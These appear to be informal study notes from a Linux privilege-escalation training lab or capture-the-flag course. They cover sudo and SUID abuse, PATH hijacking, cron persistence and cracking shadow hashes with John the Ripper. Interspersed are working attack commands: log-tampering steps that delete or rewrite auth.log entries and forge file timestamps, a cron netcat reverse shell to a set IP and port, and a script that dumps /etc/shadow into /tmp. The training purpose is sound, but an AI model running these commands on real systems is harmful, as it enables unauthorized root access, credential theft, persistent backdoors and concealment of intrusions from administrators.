Zeus accounts?
make SURE THAT when using john that the account hash 
been perfectly copied over to a textfile.
sudo -l 

SUDO vuln.
    Commands that can access the contents of other files
    https://gtfobins.github.io/gtfobins/tcpdump/
    Dangerous commands
    Commands that download files
    Commands that execute other commands (i.e. editors)
    Dangerous commands
    
Insecure Permissions    
CRON
World-Writable Files and Directories
Dot '.' in PATH --- I AM NOT DOING THIS
Home directory is not a worldwritable directory.
Dont try to escalate through a file i own.

dont know where to put something, put it in /tmp

if somebody has . in path it can be exploited
by creating an exectuable with the same name as a command
and running something within this script.

+++(which gdb) probably is bufferoverflow++++
ls -latr show recently modified at bottom

----------------

auth.log/secure
Logins/authentications

lastlog
Each users' last successful login time

btmp
Bad login attempts

sulog
Usage of SU command

utmp
Currently logged in users (W command)

wtmp
Permanent record on user on/off


file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
``````````````````````````````````````````````````
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail


---------------------------
cleaning logs
GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
-----------------------------
time edit files
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
------------------------------


which gdb
sudo -l = something might not always be there
gtfo bins for that binary
ignore shell; = go for sudo
do not try a mechanism that requires to update.

copy the code and paste it
make sure its !/bin/bash

find / type f -perm /4000 2>/dev/null = looking for suid bit (sticky) 
plug ALL into gtfobin.
else 
    find / type f -perm /2000 2>/dev/null = looking for sgid bit (sticky)
    find / type f -perm /6000 2>/dev/null = looking for suid&sguid bit (sticky)
    
    
    /etc/sudoers is way to escalate privileges.
    if the file/program is owned by root and the program can append 
    i can add an entry into the sudoers file.
============================================================
Crontab
if script leads to another script
if it runs out of /tmp or users home directory
net cat listener

====================================
cat /etc/shhadow

copy the whole entry

john --wordlist=mywordlist.txt 
or john sick_hash.txt - the shadow entry cp to a txt file

once cracked john --show sick_hash.txt

======================================
===================================



questions
Once you obtain root access, you are to implement persistence using a reverse bash shell via CRON.
The IP address and port for the reverse shell will be supplied to you. IP: 192.168.28.135 Port: 33403
There are several CRON files you can use, so any one of them can be used. Your CRON job is to beacon out every minute.
If it isnâ€™t set to beacon every minute, you will not get the flag. Once completed, the flag will be placed in the /tmp directory.
 * *   *   *   *    nc 192.168.28.135 33403 -e /bin/bash




There is a user on the system with the ability to sudo certain programs that has a '.' 
dot in their path and is navigating to and listing the contents of common world writable 
directories approximately every five minutes.
The user's script is running like this:
cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
The flag is located in this users home directory.
#!/bin/bash
whoami >> /tmp/rootstuff.txt
cat /etc/shadow >> /tmp/rootstuff.txt |OR|  /sbin/ls /root/

